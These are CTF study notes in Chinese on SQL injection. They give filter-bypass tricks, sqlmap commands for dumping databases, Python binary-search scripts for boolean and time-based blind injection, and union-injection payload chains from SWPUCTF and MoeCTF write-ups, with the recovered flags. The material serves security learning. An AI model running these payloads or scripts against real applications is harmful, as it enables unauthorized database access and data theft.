# SQL

[TOC]

---

## 绕过方法

空格 => `/**/`

等号=> `like`

### 注释符号

![image-20240904121322640](https://gitee.com/bx33661/image/raw/master/path/image-20240904121322640.png)

1. `#` 需要写成编码形式-`%23`
2. `--+`:因为SQL中的`-- `注释后面有一个空格，所以在url下常被写作`--+`
3. `/*`

> 这里涉及一个URL编码的过程，之前有点混乱，我查了一下：
>
> 具体笔记我整理在

### 需要注意的

- **MySQL**：默认情况下，表名和列名不区分大小写，但在Unix/Linux系统上，文件系统是区分大小写的，因此创建数据库和表时应该使用一致的大小写。

## 语法

### Mysql的`IF`语句

```sql
IF (condition, true_value, false_value);
```

- `condition`判断条件

- `true_value` 条件成立的返回值
- ` false_value` 条件不成立返回的值

*例子：*

```sql
SELECT
  name,
  salary,
  IF(salary > 50000, '高薪', '普通薪资') AS salary_level
FROM
  employees;
```



### SUBSTR()

```sql
SUBSTR(str, pos, len);
```

- `str`：指定字符串
- `pos`：子字符串开始的位置。在MySQL中，字符串的第一个字符位置是1。
- `len`:  返回长度（可选）



### MID()

> 在SQL中，`MID()` 函数（在某些数据库系统中也可能称为 `SUBSTR()` 或 `SUBSTRING()`）用于从字符串中提取子字符串。`MID()` 函数通常有三个参数，其基本语法如下：
>
> ```sql
> MID(string, start, length)
> ```
>
> 这里的参数含义是：
>
> - `string`：要提取子字符串的原始字符串。
> - `start`：子字符串开始的位置。在大多数SQL实现中，字符串的第一个字符的位置是1。
> - `length`：要提取的子字符串的长度

小例子，就拿-提取班级学生姓氏问题：

```sql
student_id  | name
------------|----------------
1           | 张, 三
2           | 李, 四
3           | 王, 五
```

```sql
SELECT student_id, MID(name, 1, INSTR(name, ',') - 1) AS surname
FROM classone;
```

这个SQL语句的作用是从`name`字段中提取从第一个字符开始，到逗号之前的所有字符，即学生的姓。`INSTR(name, ',')`函数用于找到逗号在字符串中的位置。



### Sleep()函数

在SQL中，`SLEEP()` 函数用于暂停执行SQL查询指定的秒数,在Mysql中可以使用

```sql
SELECT SLEEP(5);
```

执行这个查询之后数据库不会执行任何操作，只是简单的停留5秒



### GROUP_CONCAT()

`GROUP_CONCAT()` 是一个聚合函数，它将多个字符串连接成一个单独的字符串

![image-20240902231147184](https://gitee.com/bx33661/image/raw/master/path/image-20240902231147184.png)

这里我利用`Navicat`做了一个小例子：

```sql
SELECT name, GROUP_CONCAT(course) AS courses
FROM students
GROUP BY name;
```





## 注入方式

### SQLmap使用

![image-20240902231551675](https://gitee.com/bx33661/image/raw/master/path/image-20240902231551675.png)

官网：https://sqlmap.org/

常用命令经过最近使用总结如下：

```bash
python sqlmap.py -u "https://xxx/?id=1" --dbs # 查询所有数据库
python sqlmap.py -u "https://xxx/?id=1" -D test --tables # 查询...数据库下所有表
python sqlmap.py -u "https://xxx/?id=1" -D test --schema # 查询..数据库下所有表结构
python sqlmap.py -u "https://xxx/?id=1" -D test -T f1ag_table --column # 查询..数据库中表的列
python sqlmap.py -u "https://xxx/?id=1" -D test -T f1ag_table --dump # 获取表的内容
python sqlmap.py -u "https://xxx/" --data "id=1" --dbs # 传输POST参数
python sqlmap.py -u "https://xxx/" --all # 获取所有信息
```

清除缓存：

> 每次使用都会以日志的方式记录储存在对应文件夹中

```bash
python sqlmap.py -u "https://xxx/" --purge
```



### 联合注入

6个基本流程：

1. 判断注入类型：字符型 or 整数型------ **目的就是要构造闭合**

1. 查列数
2. 确定字段位置
3. 查表名称
4. 查列名称
5. 获取目标数据

数据库的结构一般是：*数据库（database）*-> *表(tables)* -> *列(column)* -> *数据(data)*



做题中的一个例子：题目的语法如下，GET的参数是id

```php
<?php
$sql = "SELECT username,password FROM users WHERE id = ".'(((((('.$_GET["id"].'))))))';
$result = $conn->query($sql);
```

```
?id=-1)))))).....
```

需要添加相应的括号使6层括号闭合，才能执行后面的代码！





### 布尔盲注

| 十进制 | 二进制   | 八进制 | 十六进制 | 字符   | 十进制 | 二进制   | 八进制 | 十六进制 | 字符   |
| ------ | -------- | ------ | -------- | ------ | ------ | -------- | ------ | -------- | ------ |
| 32     | 00100000 | 040    | 20       | (空格) | 80     | 01010000 | 120    | 50       | P      |
| 33     | 00100001 | 041    | 21       | !      | 81     | 01010001 | 121    | 51       | Q      |
| 34     | 00100010 | 042    | 22       | "      | 82     | 01010010 | 122    | 52       | R      |
| 35     | 00100011 | 043    | 23       | #      | 83     | 01010011 | 123    | 53       | S      |
| 36     | 00100100 | 044    | 24       | $      | 84     | 01010100 | 124    | 54       | T      |
| 37     | 00100101 | 045    | 25       | %      | 85     | 01010101 | 125    | 55       | U      |
| 38     | 00100110 | 046    | 26       | &      | 86     | 01010110 | 126    | 56       | V      |
| 39     | 00100111 | 047    | 27       | '      | 87     | 01010111 | 127    | 57       | W      |
| 40     | 00101000 | 050    | 28       | (      | 88     | 01011000 | 130    | 58       | X      |
| 41     | 00101001 | 051    | 29       | )      | 89     | 01011001 | 131    | 59       | Y      |
| 42     | 00101010 | 052    | 2A       | *      | 90     | 01011010 | 132    | 5A       | Z      |
| 43     | 00101011 | 053    | 2B       | +      | 91     | 01011011 | 133    | 5B       | [      |
| 44     | 00101100 | 054    | 2C       | ,      | 92     | 01011100 | 134    | 5C       | \      |
| 45     | 00101101 | 055    | 2D       | -      | 93     | 01011101 | 135    | 5D       | ]      |
| 46     | 00101110 | 056    | 2E       | .      | 94     | 01011110 | 136    | 5E       | ^      |
| 47     | 00101111 | 057    | 2F       | /      | 95     | 01011111 | 137    | 5F       | _      |
| 48     | 00110000 | 060    | 30       | 0      | 96     | 01100000 | 140    | 60       | `      |
| 49     | 00110001 | 061    | 31       | 1      | 97     | 01100001 | 141    | 61       | a      |
| 50     | 00110010 | 062    | 32       | 2      | 98     | 01100010 | 142    | 62       | b      |
| 51     | 00110011 | 063    | 33       | 3      | 99     | 01100011 | 143    | 63       | c      |
| 52     | 00110100 | 064    | 34       | 4      | 100    | 01100100 | 144    | 64       | d      |
| 53     | 00110101 | 065    | 35       | 5      | 101    | 01100101 | 145    | 65       | e      |
| 54     | 00110110 | 066    | 36       | 6      | 102    | 01100110 | 146    | 66       | f      |
| 55     | 00110111 | 067    | 37       | 7      | 103    | 01100111 | 147    | 67       | g      |
| 56     | 00111000 | 070    | 38       | 8      | 104    | 01101000 | 150    | 68       | h      |
| 57     | 00111001 | 071    | 39       | 9      | 105    | 01101001 | 151    | 69       | i      |
| 58     | 00111010 | 072    | 3A       | :      | 106    | 01101010 | 152    | 6A       | j      |
| 59     | 00111011 | 073    | 3B       | ;      | 107    | 01101011 | 153    | 6B       | k      |
| 60     | 00111100 | 074    | 3C       | <      | 108    | 01101100 | 154    | 6C       | l      |
| 61     | 00111101 | 075    | 3D       | =      | 109    | 01101101 | 155    | 6D       | m      |
| 62     | 00111110 | 076    | 3E       | >      | 110    | 01101110 | 156    | 6E       | n      |
| 63     | 00111111 | 077    | 3F       | ?      | 111    | 01101111 | 157    | 6F       | o      |
| 64     | 01000000 | 100    | 40       | @      | 112    | 01110000 | 160    | 70       | p      |
| 65     | 01000001 | 101    | 41       | A      | 113    | 01110001 | 161    | 71       | q      |
| 66     | 01000010 | 102    | 42       | B      | 114    | 01110010 | 162    | 72       | r      |
| 67     | 01000011 | 103    | 43       | C      | 115    | 01110011 | 163    | 73       | s      |
| 68     | 01000100 | 104    | 44       | D      | 116    | 01110100 | 164    | 74       | t      |
| 69     | 01000101 | 105    | 45       | E      | 117    | 01110101 | 165    | 75       | u      |
| 70     | 01000110 | 106    | 46       | F      | 118    | 01110110 | 166    | 76       | v      |
| 71     | 01000111 | 107    | 47       | G      | 119    | 01110111 | 167    | 77       | w      |
| 72     | 01001000 | 110    | 48       | H      | 120    | 01111000 | 170    | 78       | x      |
| 73     | 01001001 | 111    | 49       | I      | 121    | 01111001 | 171    | 79       | y      |
| 74     | 01001010 | 112    | 4A       | J      | 122    | 01111010 | 172    | 7A       | z      |
| 75     | 01001011 | 113    | 4B       | K      | 123    | 01111011 | 173    | 7B       | {      |
| 76     | 01001100 | 114    | 4C       | L      | 124    | 01111100 | 174    | 7C       |        |
| 77     | 01001101 | 115    | 4D       | M      | 125    | 01111101 | 175    | 7D       | }      |
| 78     | 01001110 | 116    | 4E       | N      | 126    | 01111110 | 176    | 7E       | ~      |
| 79     | 01001111 | 117    | 4F       | O      | 127    | 01111111 | 177    | 7F       | (删除) |

从32开始到127是可打印字符，所以后续脚本可以采用这个范围

```python
#布尔盲注脚本，二分法
import requests
url = '' #url
flag = ''

for i in range(1, 50):
    l,r = 32, 127
    while l < r:
        mid = (l+r) // 2
        # where id = 1
        #爆用户名
        #payload = f'2-if(ascii(substr((select user()), {i}, 1))<={mid}, 1, 0)'
        
        #爆表名  
        #payload = f'2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {i}, 1))<={mid}, 1, 0)'
        
        #爆列名
        # payload = f'2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'f1ag\'), {i}, 1))<={mid}, 1, 0)'
        
        #爆flag
        payload = f'2-if(ascii(substr((select group_concat(f1ag_column) from f1ag), {i}, 1))<={mid}, 1, 0)'
        """
        上面这行代码是关键，构造出来了执行命令的SQL语句，其中：
        利用二分法的关键是，如果此时的这个字符的ascii码小于等于mid，那么就会返回1，否则返回0
        """
        res = requests.get(url, params={
            'id': payload
        })
        #判断回显信息，输出这个字符结果，每道题的回显信息不同！
        if "id = 1" in res.text: # “id=1”是这个题的特点回显，如果成立就会出现id=1，不成立就不会出现
            r = mid
        else:
            l = mid+1
    flag += chr(l)
    print(flag)
```

对这个小模版进行了注释，帮助我更好地理解二分法在盲注脚本中的应用，可以加快速度和效率

仔细分析一下，与联合注入相比爆表的流程还是一样的，只是我们得到回显信息不同



### 时间盲注

使用于网站没有任何特别回显的时候

```python
#时间盲注，二分法
import requests
url = '' #url
flag = ''


for i in range(1, 50):
    l,r = 32, 127
    while l < r:
        mid = (l+r) // 2
        # where id = 1
        # 爆用户名
        # payload = f'2-if(ascii(substr((select user()), {i}, 1))<={mid}, 1, 0)'

        # 爆表名
        # payload = f'2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {i}, 1))<={mid}, 1, 0)'
        
        # 爆列名
        # payload = f'2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'f1ag_table\'), {i}, 1))<={mid}, 1, 0)'
        
        #爆最后的flag
        payload = f'2-if(ascii(substr((select group_concat(flag) from flag_table), {i}, 1))<={mid}, sleep(1), 0)'
        res = requests.get(url, params={
            'id': payload
        })
        
        if res.elapsed.total_seconds() > 1.: 
            #网络请求的耗时大于1秒
            r = mid
        else:
            l = mid+1
    flag += chr(l)
    print(flag)
```

但即使使用二分法，采用`sleep（）`也会造成注入的时间会很长，

跟布尔盲注的流程和逻辑是一模一样的





### 报错注入





### 堆叠注入

就是，一堆 sql 语句(多条)一起执行

> 与联合注入的区别：`union`执行语句类型是有限的，只可以用来执行查询语句，而堆叠注入则可以执行更多种类的sql语句

当后台使用**mysql_query()** 则不能使用堆叠

mysql_query()向与指定的 `link_identifier` 关联的服务器中的当前活动数据库发送一条查询（不支持多条查询）

```sql
show databases;
show tables;
show columns from table;

handler {TABLE} open;
handler {TABLE} read first;
handler {TABLE} close;
```







## 最近题目WP

### [SWPUCTF 2021 新生赛]sql

---

```bash
?wllm=1'order/**/by/**/1,2,3%23

?wllm=-1'union/**/select/**/1,database(),3%23

?wllm=-1'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23

#Your Login name:2
#Your Password:LTLT_flag,users

?wllm=-1'union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'test_db'%23

?wllm=-1'union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_
flag%23

#这里substr()被ban了,采用`mid()`
```

拼接flag

```
NSSCTF{281fa5a9-372c
TF{281fa5a9-372c-42e
1fa5a9-372c-42e0-820
9-372c-42e0-820b-8ec
b-8ec92617a8e7}

NSSCTF{281fa5a9-372c-42e0-820b-8ec92617a8e7}
```



### [SWPUCTF 2022 新生赛]ez_sql

![image-20240901223434041](https://gitee.com/bx33661/image/raw/master/path/image-20240901223434041.png)

> 联合注入，主要是采用不同方式绕过被ban的语法

发现`or`被消除了，双写`or`，同时空格被过滤这里采用`/**/`

```
nss=1'oorrder/**/by/**/3%23 

nss=0'ununionion/**/select/**/1,2,database()%23 

nss=0'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='NSS_db';#

nss=0'ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb';#

nss=0'ununionion/**/select/**/1,2,group_concat(flll444g)/**/from/**/NSS_tb;#

nss=0'ununionion/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_tb;#
```

最后得到flag

```
flag: NSSCTF{5bc4c4a6-005a-4523-a6b1-40076d3489f7}
```



## Nssctf [MoeCTF 2022]Sqlmap_boy

![image-20240901165733983](https://gitee.com/bx33661/image/raw/master/path/image-20240901165733983.png)

我们采用`admin/admin`进入，发现`?id=`的注入口

```
secrets.php?id=1'order by 1,2,3--+

secrets.php?id=-1'union select 1,2,database()--+

secrets.php?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='moectf'--+

secrets.php?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='flag'--+

secrets.php?id=-1' union select 1,2,group_concat(flAg)from moectf.flag--+
```

最后得到flag

![image-20240901170731614](https://gitee.com/bx33661/image/raw/master/path/image-20240901170731614.png)

**思路参考文章：**

- 奇安信社区《SQL注入精粹：从0到1的注入之路》：https://forum.butian.net/share/2768

- 
-1"/**/union/**/select/**/2,group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema='ctf'#

```
-1"/**/union/**/select/**/2,group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name='Fl4g'#

 "id,des,value"

-1"/**/union/**/select/**/2,group_concat(value)from ctf.Fl4g#
```


